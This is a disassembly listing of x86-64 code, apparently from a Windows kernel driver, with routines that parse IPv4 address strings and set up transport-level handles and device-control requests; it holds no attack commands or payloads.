   12e61:	41 55                	push   %r13
   12e63:	41 56                	push   %r14
   12e65:	48 83 ec 30          	sub    $0x30,%rsp
   12e69:	0f be 31             	movsbl (%rcx),%esi
   12e6c:	4c 8b f2             	mov    %rdx,%r14
   12e6f:	48 8b e9             	mov    %rcx,%rbp
   12e72:	48 8d 58 d8          	lea    -0x28(%rax),%rbx
   12e76:	e9 b3 00 00 00       	jmp    0x12f2e
   12e7b:	33 ff                	xor    %edi,%edi
   12e7d:	44 8d 67 0a          	lea    0xa(%rdi),%r12d
   12e81:	40 80 fe 30          	cmp    $0x30,%sil
   12e85:	75 26                	jne    0x12ead
   12e87:	48 ff c5             	inc    %rbp
   12e8a:	40 8a 75 00          	mov    0x0(%rbp),%sil
   12e8e:	40 80 fe 78          	cmp    $0x78,%sil
   12e92:	74 0c                	je     0x12ea0
   12e94:	40 80 fe 58          	cmp    $0x58,%sil
   12e98:	74 06                	je     0x12ea0
   12e9a:	44 8d 67 08          	lea    0x8(%rdi),%r12d
   12e9e:	eb 0d                	jmp    0x12ead
   12ea0:	41 bc 10 00 00 00    	mov    $0x10,%r12d
   12ea6:	48 ff c5             	inc    %rbp
   12ea9:	40 8a 75 00          	mov    0x0(%rbp),%sil
   12ead:	40 80 fe 7f          	cmp    $0x7f,%sil
   12eb1:	7f 1e                	jg     0x12ed1
   12eb3:	44 0f be ee          	movsbl %sil,%r13d
   12eb7:	41 8b cd             	mov    %r13d,%ecx
   12eba:	ff 15 60 22 00 00    	call   *0x2260(%rip)        # 0x15120
   12ec0:	85 c0                	test   %eax,%eax
   12ec2:	74 0d                	je     0x12ed1
   12ec4:	41 8b c4             	mov    %r12d,%eax
   12ec7:	0f af c7             	imul   %edi,%eax
   12eca:	42 8d 7c 28 d0       	lea    -0x30(%rax,%r13,1),%edi
   12ecf:	eb d5                	jmp    0x12ea6
   12ed1:	41 83 fc 10          	cmp    $0x10,%r12d
   12ed5:	75 3a                	jne    0x12f11
   12ed7:	40 80 fe 7f          	cmp    $0x7f,%sil
   12edb:	7f 34                	jg     0x12f11
   12edd:	44 0f be ee          	movsbl %sil,%r13d
   12ee1:	41 8b cd             	mov    %r13d,%ecx
   12ee4:	ff 15 46 22 00 00    	call   *0x2246(%rip)        # 0x15130
   12eea:	85 c0                	test   %eax,%eax
   12eec:	74 23                	je     0x12f11
   12eee:	41 8b cd             	mov    %r13d,%ecx
   12ef1:	ff 15 31 22 00 00    	call   *0x2231(%rip)        # 0x15128
   12ef7:	f7 d8                	neg    %eax
   12ef9:	8b c7                	mov    %edi,%eax
   12efb:	1b c9                	sbb    %ecx,%ecx
   12efd:	c1 e0 04             	shl    $0x4,%eax
   12f00:	83 e1 20             	and    $0x20,%ecx
   12f03:	83 c1 41             	add    $0x41,%ecx
   12f06:	44 2b e9             	sub    %ecx,%r13d
   12f09:	41 8d 7d 0a          	lea    0xa(%r13),%edi
   12f0d:	0b f8                	or     %eax,%edi
   12f0f:	eb 95                	jmp    0x12ea6
   12f11:	40 80 fe 2e          	cmp    $0x2e,%sil
   12f15:	75 48                	jne    0x12f5f
   12f17:	48 8d 44 24 2c       	lea    0x2c(%rsp),%rax
   12f1c:	48 3b d8             	cmp    %rax,%rbx
   12f1f:	73 1d                	jae    0x12f3e
   12f21:	89 3b                	mov    %edi,(%rbx)
   12f23:	48 83 c3 04          	add    $0x4,%rbx
   12f27:	48 ff c5             	inc    %rbp
   12f2a:	0f be 75 00          	movsbl 0x0(%rbp),%esi
   12f2e:	8b ce                	mov    %esi,%ecx
   12f30:	ff 15 ea 21 00 00    	call   *0x21ea(%rip)        # 0x15120
   12f36:	85 c0                	test   %eax,%eax
   12f38:	0f 85 3d ff ff ff    	jne    0x12e7b
   12f3e:	33 c0                	xor    %eax,%eax
   12f40:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   12f45:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   12f4a:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   12f4f:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   12f54:	48 83 c4 30          	add    $0x30,%rsp
   12f58:	41 5e                	pop    %r14
   12f5a:	41 5d                	pop    %r13
   12f5c:	41 5c                	pop    %r12
   12f5e:	c3                   	ret
   12f5f:	40 84 f6             	test   %sil,%sil
   12f62:	74 14                	je     0x12f78
   12f64:	40 80 fe 7f          	cmp    $0x7f,%sil
   12f68:	7f d4                	jg     0x12f3e
   12f6a:	40 0f be ce          	movsbl %sil,%ecx
   12f6e:	ff 15 94 21 00 00    	call   *0x2194(%rip)        # 0x15108
   12f74:	85 c0                	test   %eax,%eax
   12f76:	74 c6                	je     0x12f3e
   12f78:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   12f7d:	48 2b d8             	sub    %rax,%rbx
   12f80:	48 c1 fb 02          	sar    $0x2,%rbx
   12f84:	83 c3 01             	add    $0x1,%ebx
   12f87:	74 b5                	je     0x12f3e
   12f89:	83 eb 02             	sub    $0x2,%ebx
   12f8c:	74 45                	je     0x12fd3
   12f8e:	83 eb 01             	sub    $0x1,%ebx
   12f91:	74 24                	je     0x12fb7
   12f93:	83 fb 01             	cmp    $0x1,%ebx
   12f96:	75 50                	jne    0x12fe8
   12f98:	81 ff ff 00 00 00    	cmp    $0xff,%edi
   12f9e:	77 9e                	ja     0x12f3e
   12fa0:	8b 44 24 20          	mov    0x20(%rsp),%eax
   12fa4:	c1 e0 08             	shl    $0x8,%eax
   12fa7:	0b 44 24 24          	or     0x24(%rsp),%eax
   12fab:	c1 e0 08             	shl    $0x8,%eax
   12fae:	0b 44 24 28          	or     0x28(%rsp),%eax
   12fb2:	c1 e0 08             	shl    $0x8,%eax
   12fb5:	eb 2f                	jmp    0x12fe6
   12fb7:	81 ff ff ff 00 00    	cmp    $0xffff,%edi
   12fbd:	0f 87 7b ff ff ff    	ja     0x12f3e
   12fc3:	8b 44 24 20          	mov    0x20(%rsp),%eax
   12fc7:	c1 e0 08             	shl    $0x8,%eax
   12fca:	0b 44 24 24          	or     0x24(%rsp),%eax
   12fce:	c1 e0 10             	shl    $0x10,%eax
   12fd1:	eb 13                	jmp    0x12fe6
   12fd3:	81 ff ff ff ff 00    	cmp    $0xffffff,%edi
   12fd9:	0f 87 5f ff ff ff    	ja     0x12f3e
   12fdf:	8b 44 24 20          	mov    0x20(%rsp),%eax
   12fe3:	c1 e0 18             	shl    $0x18,%eax
   12fe6:	0b f8                	or     %eax,%edi
   12fe8:	4d 85 f6             	test   %r14,%r14
   12feb:	74 27                	je     0x13014
   12fed:	8b d7                	mov    %edi,%edx
   12fef:	8b c7                	mov    %edi,%eax
   12ff1:	8b cf                	mov    %edi,%ecx
   12ff3:	81 e2 00 00 ff 00    	and    $0xff0000,%edx
   12ff9:	81 e1 00 ff 00 00    	and    $0xff00,%ecx
   12fff:	c1 e8 10             	shr    $0x10,%eax
   13002:	c1 e7 10             	shl    $0x10,%edi
   13005:	0b d0                	or     %eax,%edx
   13007:	0b cf                	or     %edi,%ecx
   13009:	c1 ea 08             	shr    $0x8,%edx
   1300c:	c1 e1 08             	shl    $0x8,%ecx
   1300f:	0b d1                	or     %ecx,%edx
   13011:	41 89 16             	mov    %edx,(%r14)
   13014:	b8 01 00 00 00       	mov    $0x1,%eax
   13019:	e9 22 ff ff ff       	jmp    0x12f40
   1301e:	cc                   	int3
   1301f:	cc                   	int3
   13020:	cc                   	int3
   13021:	cc                   	int3
   13022:	cc                   	int3
   13023:	cc                   	int3
   13024:	48 8b c4             	mov    %rsp,%rax
   13027:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1302b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1302f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   13033:	57                   	push   %rdi
   13034:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   1303b:	48 83 60 d0 00       	andq   $0x0,-0x30(%rax)
   13040:	48 83 60 e8 00       	andq   $0x0,-0x18(%rax)
   13045:	48 83 60 f0 00       	andq   $0x0,-0x10(%rax)
   1304a:	8b ea                	mov    %edx,%ebp
   1304c:	ba 2f 00 00 00       	mov    $0x2f,%edx
   13051:	48 89 48 d8          	mov    %rcx,-0x28(%rax)
   13055:	8d 4a d2             	lea    -0x2e(%rdx),%ecx
   13058:	41 8a f9             	mov    %r9b,%dil
   1305b:	41 0f b7 f0          	movzwl %r8w,%esi
   1305f:	c7 40 c8 30 00 00 00 	movl   $0x30,-0x38(%rax)
   13066:	c7 40 e0 40 02 00 00 	movl   $0x240,-0x20(%rax)
   1306d:	ff 15 b5 1f 00 00    	call   *0x1fb5(%rip)        # 0x15028
   13073:	48 8b d8             	mov    %rax,%rbx
   13076:	48 85 c0             	test   %rax,%rax
   13079:	75 0a                	jne    0x13085
   1307b:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   13080:	e9 06 01 00 00       	jmp    0x1318b
   13085:	83 20 00             	andl   $0x0,(%rax)
   13088:	c6 40 04 00          	movb   $0x0,0x4(%rax)
   1308c:	c6 40 05 10          	movb   $0x10,0x5(%rax)
   13090:	c7 44 24 50 2f 00 00 	movl   $0x2f,0x50(%rsp)
   13097:	00 
   13098:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   1309d:	b9 0e 00 00 00       	mov    $0xe,%ecx
   130a2:	b8 16 00 00 00       	mov    $0x16,%eax
   130a7:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   130ac:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   130b1:	66 89 43 06          	mov    %ax,0x6(%rbx)
   130b5:	48 8b 05 84 1a 00 00 	mov    0x1a84(%rip),%rax        # 0x14b40
   130bc:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   130c1:	48 89 43 08          	mov    %rax,0x8(%rbx)
   130c5:	48 8b 05 7c 1a 00 00 	mov    0x1a7c(%rip),%rax        # 0x14b48
   130cc:	48 89 43 10          	mov    %rax,0x10(%rbx)
   130d0:	8a 05 7a 1a 00 00    	mov    0x1a7a(%rip),%al        # 0x14b50
   130d6:	88 43 18             	mov    %al,0x18(%rbx)
   130d9:	0f b6 43 05          	movzbl 0x5(%rbx),%eax
   130dd:	66 89 4c 18 0d       	mov    %cx,0xd(%rax,%rbx,1)
   130e2:	c7 44 18 09 01 00 00 	movl   $0x1,0x9(%rax,%rbx,1)
   130e9:	00 
   130ea:	66 89 74 18 11       	mov    %si,0x11(%rax,%rbx,1)
   130ef:	89 6c 18 13          	mov    %ebp,0x13(%rax,%rbx,1)
   130f3:	b9 02 00 00 00       	mov    $0x2,%ecx
   130f8:	66 89 4c 18 0f       	mov    %cx,0xf(%rax,%rbx,1)
   130fd:	33 c9                	xor    %ecx,%ecx
   130ff:	40 f6 df             	neg    %dil
   13102:	48 8b bc 24 d0 00 00 	mov    0xd0(%rsp),%rdi
   13109:	00 
   1310a:	48 89 4c 18 17       	mov    %rcx,0x17(%rax,%rbx,1)
   1310f:	1b c0                	sbb    %eax,%eax
   13111:	21 4c 24 40          	and    %ecx,0x40(%rsp)
   13115:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   1311c:	00 
   1311d:	83 e0 03             	and    $0x3,%eax
   13120:	89 44 24 30          	mov    %eax,0x30(%rsp)
   13124:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1312b:	00 
   1312c:	48 21 4c 24 20       	and    %rcx,0x20(%rsp)
   13131:	48 8b cf             	mov    %rdi,%rcx
   13134:	ff 15 4e 1f 00 00    	call   *0x1f4e(%rip)        # 0x15088
   1313a:	33 d2                	xor    %edx,%edx
   1313c:	48 8b cb             	mov    %rbx,%rcx
   1313f:	8b f0                	mov    %eax,%esi
   13141:	ff 15 19 1f 00 00    	call   *0x1f19(%rip)        # 0x15060
   13147:	85 f6                	test   %esi,%esi
   13149:	79 04                	jns    0x1314f
   1314b:	8b c6                	mov    %esi,%eax
   1314d:	eb 3c                	jmp    0x1318b
   1314f:	48 8b 84 24 d8 00 00 	mov    0xd8(%rsp),%rax
   13156:	00 
   13157:	48 8b 0f             	mov    (%rdi),%rcx
   1315a:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   13160:	45 33 c9             	xor    %r9d,%r9d
   13163:	45 33 c0             	xor    %r8d,%r8d
   13166:	ba ff 01 1f 00       	mov    $0x1f01ff,%edx
   1316b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   13170:	ff 15 d2 1f 00 00    	call   *0x1fd2(%rip)        # 0x15148
   13176:	8b d8                	mov    %eax,%ebx
   13178:	85 c0                	test   %eax,%eax
   1317a:	79 0d                	jns    0x13189
   1317c:	48 8b 0f             	mov    (%rdi),%rcx
   1317f:	ff 15 ab 1e 00 00    	call   *0x1eab(%rip)        # 0x15030
   13185:	8b c3                	mov    %ebx,%eax
   13187:	eb 02                	jmp    0x1318b
   13189:	33 c0                	xor    %eax,%eax
   1318b:	4c 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%r11
   13192:	00 
   13193:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   13197:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   1319b:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1319f:	49 8b e3             	mov    %r11,%rsp
   131a2:	5f                   	pop    %rdi
   131a3:	c3                   	ret
   131a4:	cc                   	int3
   131a5:	cc                   	int3
   131a6:	cc                   	int3
   131a7:	cc                   	int3
   131a8:	cc                   	int3
   131a9:	cc                   	int3
   131aa:	cc                   	int3
   131ab:	cc                   	int3
   131ac:	48 8b c4             	mov    %rsp,%rax
   131af:	48 89 58 08          	mov    %rbx,0x8(%rax)
   131b3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   131b7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   131bb:	57                   	push   %rdi
   131bc:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   131c3:	48 83 60 d0 00       	andq   $0x0,-0x30(%rax)
   131c8:	48 83 60 e8 00       	andq   $0x0,-0x18(%rax)
   131cd:	48 83 60 f0 00       	andq   $0x0,-0x10(%rax)
   131d2:	48 8b ea             	mov    %rdx,%rbp
   131d5:	ba 22 00 00 00       	mov    $0x22,%edx
   131da:	48 89 48 d8          	mov    %rcx,-0x28(%rax)
   131de:	8d 4a df             	lea    -0x21(%rdx),%ecx
   131e1:	49 8b f9             	mov    %r9,%rdi
   131e4:	41 8a f0             	mov    %r8b,%sil
   131e7:	c7 40 c8 30 00 00 00 	movl   $0x30,-0x38(%rax)
   131ee:	c7 40 e0 40 02 00 00 	movl   $0x240,-0x20(%rax)
   131f5:	ff 15 2d 1e 00 00    	call   *0x1e2d(%rip)        # 0x15028
   131fb:	48 8b d8             	mov    %rax,%rbx
   131fe:	48 85 c0             	test   %rax,%rax
   13201:	75 0a                	jne    0x1320d
   13203:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   13208:	e9 db 00 00 00       	jmp    0x132e8
   1320d:	83 20 00             	andl   $0x0,(%rax)
   13210:	c6 40 04 00          	movb   $0x0,0x4(%rax)
   13214:	c6 40 05 11          	movb   $0x11,0x5(%rax)
   13218:	c7 44 24 50 22 00 00 	movl   $0x22,0x50(%rsp)
   1321f:	00 
   13220:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   13225:	b8 08 00 00 00       	mov    $0x8,%eax
   1322a:	66 89 43 06          	mov    %ax,0x6(%rbx)
   1322e:	48 8b 05 2b 19 00 00 	mov    0x192b(%rip),%rax        # 0x14b60
   13235:	40 f6 de             	neg    %sil
   13238:	48 89 43 08          	mov    %rax,0x8(%rbx)
   1323c:	48 8b 05 25 19 00 00 	mov    0x1925(%rip),%rax        # 0x14b68
   13243:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   13248:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1324c:	0f b7 05 1d 19 00 00 	movzwl 0x191d(%rip),%eax        # 0x14b70
   13253:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   13258:	66 89 43 18          	mov    %ax,0x18(%rbx)
   1325c:	0f b6 43 05          	movzbl 0x5(%rbx),%eax
   13260:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   13265:	48 89 6c 18 09       	mov    %rbp,0x9(%rax,%rbx,1)
   1326a:	1b c0                	sbb    %eax,%eax
   1326c:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   13271:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   13278:	00 
   13279:	83 e0 03             	and    $0x3,%eax
   1327c:	48 8b cf             	mov    %rdi,%rcx
   1327f:	89 44 24 30          	mov    %eax,0x30(%rsp)
   13283:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1328a:	00 
   1328b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   13291:	ff 15 f1 1d 00 00    	call   *0x1df1(%rip)        # 0x15088
   13297:	33 d2                	xor    %edx,%edx
   13299:	48 8b cb             	mov    %rbx,%rcx
   1329c:	8b f0                	mov    %eax,%esi
   1329e:	ff 15 bc 1d 00 00    	call   *0x1dbc(%rip)        # 0x15060
   132a4:	85 f6                	test   %esi,%esi
   132a6:	79 04                	jns    0x132ac
   132a8:	8b c6                	mov    %esi,%eax
   132aa:	eb 3c                	jmp    0x132e8
   132ac:	48 8b 84 24 d0 00 00 	mov    0xd0(%rsp),%rax
   132b3:	00 
   132b4:	48 8b 0f             	mov    (%rdi),%rcx
   132b7:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   132bd:	45 33 c9             	xor    %r9d,%r9d
   132c0:	45 33 c0             	xor    %r8d,%r8d
   132c3:	ba ff 01 1f 00       	mov    $0x1f01ff,%edx
   132c8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   132cd:	ff 15 75 1e 00 00    	call   *0x1e75(%rip)        # 0x15148
   132d3:	8b d8                	mov    %eax,%ebx
   132d5:	85 c0                	test   %eax,%eax
   132d7:	79 0d                	jns    0x132e6
   132d9:	48 8b 0f             	mov    (%rdi),%rcx
   132dc:	ff 15 4e 1d 00 00    	call   *0x1d4e(%rip)        # 0x15030
   132e2:	8b c3                	mov    %ebx,%eax
   132e4:	eb 02                	jmp    0x132e8
   132e6:	33 c0                	xor    %eax,%eax
   132e8:	4c 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%r11
   132ef:	00 
   132f0:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   132f4:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   132f8:	49 8b 73 20          	mov    0x20(%r11),%rsi
   132fc:	49 8b e3             	mov    %r11,%rsp
   132ff:	5f                   	pop    %rdi
   13300:	c3                   	ret
   13301:	cc                   	int3
   13302:	cc                   	int3
   13303:	cc                   	int3
   13304:	cc                   	int3
   13305:	cc                   	int3
   13306:	cc                   	int3
   13307:	cc                   	int3
   13308:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1330d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   13312:	57                   	push   %rdi
   13313:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1331a:	49 8b f1             	mov    %r9,%rsi
   1331d:	48 8b f9             	mov    %rcx,%rdi
   13320:	ff 15 1a 1e 00 00    	call   *0x1e1a(%rip)        # 0x15140
   13326:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1332b:	45 33 c0             	xor    %r8d,%r8d
   1332e:	33 d2                	xor    %edx,%edx
   13330:	48 8b d8             	mov    %rax,%rbx
   13333:	ff 15 df 1d 00 00    	call   *0x1ddf(%rip)        # 0x15118
   13339:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   1333e:	4c 89 5c 24 40       	mov    %r11,0x40(%rsp)
   13343:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   13348:	45 33 c9             	xor    %r9d,%r9d
   1334b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   13350:	c6 44 24 30 01       	movb   $0x1,0x30(%rsp)
   13355:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1335a:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   13360:	41 8d 49 03          	lea    0x3(%r9),%ecx
   13364:	45 33 c0             	xor    %r8d,%r8d
   13367:	48 8b d3             	mov    %rbx,%rdx
   1336a:	ff 15 c8 1d 00 00    	call   *0x1dc8(%rip)        # 0x15138
   13370:	48 8b d0             	mov    %rax,%rdx
   13373:	48 85 c0             	test   %rax,%rax
   13376:	75 07                	jne    0x1337f
   13378:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   1337d:	eb 6f                	jmp    0x133ee
   1337f:	48 8b 80 b8 00 00 00 	mov    0xb8(%rax),%rax
   13386:	48 8d 0d 23 f5 ff ff 	lea    -0xadd(%rip),%rcx        # 0x128b0
   1338d:	48 83 60 f0 00       	andq   $0x0,-0x10(%rax)
   13392:	48 83 60 f8 00       	andq   $0x0,-0x8(%rax)
   13397:	c6 40 bb 00          	movb   $0x0,-0x45(%rax)
   1339b:	48 8b 82 b8 00 00 00 	mov    0xb8(%rdx),%rax
   133a2:	c6 40 b8 0f          	movb   $0xf,-0x48(%rax)
   133a6:	c6 40 b9 0b          	movb   $0xb,-0x47(%rax)
   133aa:	48 89 58 e0          	mov    %rbx,-0x20(%rax)
   133ae:	48 89 78 e8          	mov    %rdi,-0x18(%rax)
   133b2:	48 89 48 c8          	mov    %rcx,-0x38(%rax)
   133b6:	48 8b cb             	mov    %rbx,%rcx
   133b9:	c7 40 c0 01 00 00 00 	movl   $0x1,-0x40(%rax)
   133c0:	48 89 70 d0          	mov    %rsi,-0x30(%rax)
   133c4:	ff 15 96 1d 00 00    	call   *0x1d96(%rip)        # 0x15160
   133ca:	3d 03 01 00 00       	cmp    $0x103,%eax
   133cf:	75 1d                	jne    0x133ee
   133d1:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   133d7:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   133dc:	45 33 c9             	xor    %r9d,%r9d
   133df:	45 33 c0             	xor    %r8d,%r8d
   133e2:	33 d2                	xor    %edx,%edx
   133e4:	ff 15 66 1d 00 00    	call   *0x1d66(%rip)        # 0x15150
   133ea:	8b 44 24 50          	mov    0x50(%rsp),%eax
   133ee:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   133f5:	00 
   133f6:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   133fa:	49 8b 73 18          	mov    0x18(%r11),%rsi
   133fe:	49 8b e3             	mov    %r11,%rsp
   13401:	5f                   	pop    %rdi
   13402:	c3                   	ret
   13403:	cc                   	int3
   13404:	cc                   	int3
   13405:	cc                   	int3
   13406:	cc                   	int3
   13407:	cc                   	int3
   13408:	cc                   	int3
   13409:	cc                   	int3
   1340a:	cc                   	int3
   1340b:	cc                   	int3
   1340c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   13411:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   13416:	57                   	push   %rdi
   13417:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1341e:	48 8b f2             	mov    %rdx,%rsi
   13421:	48 8b f9             	mov    %rcx,%rdi
   13424:	ff 15 16 1d 00 00    	call   *0x1d16(%rip)        # 0x15140
   1342a:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1342f:	45 33 c0             	xor    %r8d,%r8d
   13432:	33 d2                	xor    %edx,%edx
   13434:	48 8b d8             	mov    %rax,%rbx
   13437:	ff 15 db 1c 00 00    	call   *0x1cdb(%rip)        # 0x15118
   1343d:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   13442:	4c 89 5c 24 40       	mov    %r11,0x40(%rsp)
   13447:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1344c:	45 33 c9             	xor    %r9d,%r9d
   1344f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   13454:	c6 44 24 30 01       	movb   $0x1,0x30(%rsp)
   13459:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1345e:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   13464:	41 8d 49 03          	lea    0x3(%r9),%ecx
   13468:	45 33 c0             	xor    %r8d,%r8d
   1346b:	48 8b d3             	mov    %rbx,%rdx
   1346e:	ff 15 c4 1c 00 00    	call   *0x1cc4(%rip)        # 0x15138
   13474:	48 8b d0             	mov    %rax,%rdx
   13477:	48 85 c0             	test   %rax,%rax
   1347a:	75 07                	jne    0x13483
   1347c:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   13481:	eb 5d                	jmp    0x134e0
   13483:	48 8b 80 b8 00 00 00 	mov    0xb8(%rax),%rax
   1348a:	48 8b cb             	mov    %rbx,%rcx
   1348d:	48 83 60 f0 00       	andq   $0x0,-0x10(%rax)
   13492:	48 83 60 f8 00       	andq   $0x0,-0x8(%rax)
   13497:	c6 40 bb 00          	movb   $0x0,-0x45(%rax)
   1349b:	48 8b 82 b8 00 00 00 	mov    0xb8(%rdx),%rax
   134a2:	c6 40 b8 0f          	movb   $0xf,-0x48(%rax)
   134a6:	c6 40 b9 01          	movb   $0x1,-0x47(%rax)
   134aa:	48 89 58 e0          	mov    %rbx,-0x20(%rax)
   134ae:	48 89 78 e8          	mov    %rdi,-0x18(%rax)
   134b2:	48 89 70 c0          	mov    %rsi,-0x40(%rax)
   134b6:	ff 15 a4 1c 00 00    	call   *0x1ca4(%rip)        # 0x15160
   134bc:	3d 03 01 00 00       	cmp    $0x103,%eax
   134c1:	75 1d                	jne    0x134e0
   134c3:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   134c9:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   134ce:	45 33 c9             	xor    %r9d,%r9d
   134d1:	45 33 c0             	xor    %r8d,%r8d
   134d4:	33 d2                	xor    %edx,%edx
   134d6:	ff 15 74 1c 00 00    	call   *0x1c74(%rip)        # 0x15150
   134dc:	8b 44 24 50          	mov    0x50(%rsp),%eax
   134e0:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   134e7:	00 
   134e8:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   134ec:	49 8b 73 18          	mov    0x18(%r11),%rsi
   134f0:	49 8b e3             	mov    %r11,%rsp
   134f3:	5f                   	pop    %rdi
   134f4:	c3                   	ret
   134f5:	cc                   	int3
   134f6:	cc                   	int3
   134f7:	cc                   	int3
   134f8:	cc                   	int3
   134f9:	cc                   	int3
   134fa:	cc                   	int3
   134fb:	cc                   	int3
   134fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   13501:	57                   	push   %rdi
   13502:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   13509:	48 8b f9             	mov    %rcx,%rdi
   1350c:	ff 15 2e 1c 00 00    	call   *0x1c2e(%rip)        # 0x15140
   13512:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   13517:	45 33 c0             	xor    %r8d,%r8d
   1351a:	33 d2                	xor    %edx,%edx
   1351c:	48 8b d8             	mov    %rax,%rbx
   1351f:	ff 15 f3 1b 00 00    	call   *0x1bf3(%rip)        # 0x15118
   13525:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   1352a:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1352f:	4c 89 5c 24 40       	mov    %r11,0x40(%rsp)
   13534:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   13539:	45 33 c9             	xor    %r9d,%r9d
   1353c:	c6 44 24 30 01       	movb   $0x1,0x30(%rsp)
   13541:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   13546:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1354c:	41 8d 49 03          	lea    0x3(%r9),%ecx
   13550:	45 33 c0             	xor    %r8d,%r8d
   13553:	48 8b d3             	mov    %rbx,%rdx
   13556:	ff 15 dc 1b 00 00    	call   *0x1bdc(%rip)        # 0x15138
   1355c:	48 8b d0             	mov    %rax,%rdx
   1355f:	48 85 c0             	test   %rax,%rax
   13562:	75 07                	jne    0x1356b
   13564:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   13569:	eb 59                	jmp    0x135c4
   1356b:	48 8b 80 b8 00 00 00 	mov    0xb8(%rax),%rax
   13572:	48 8b cb             	mov    %rbx,%rcx
   13575:	48 83 60 f0 00       	andq   $0x0,-0x10(%rax)
   1357a:	48 83 60 f8 00       	andq   $0x0,-0x8(%rax)
   1357f:	c6 40 bb 00          	movb   $0x0,-0x45(%rax)
   13583:	48 8b 82 b8 00 00 00 	mov    0xb8(%rdx),%rax
   1358a:	c6 40 b8 0f          	movb   $0xf,-0x48(%rax)
   1358e:	c6 40 b9 02          	movb   $0x2,-0x47(%rax)
   13592:	48 89 58 e0          	mov    %rbx,-0x20(%rax)
   13596:	48 89 78 e8          	mov    %rdi,-0x18(%rax)
   1359a:	ff 15 c0 1b 00 00    	call   *0x1bc0(%rip)        # 0x15160
   135a0:	3d 03 01 00 00       	cmp    $0x103,%eax
   135a5:	75 1d                	jne    0x135c4
   135a7:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   135ad:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   135b2:	45 33 c9             	xor    %r9d,%r9d
   135b5:	45 33 c0             	xor    %r8d,%r8d
   135b8:	33 d2                	xor    %edx,%edx
   135ba:	ff 15 90 1b 00 00    	call   *0x1b90(%rip)        # 0x15150
   135c0:	8b 44 24 50          	mov    0x50(%rsp),%eax
   135c4:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   135cb:	00 
   135cc:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   135d3:	5f                   	pop    %rdi
   135d4:	c3                   	ret
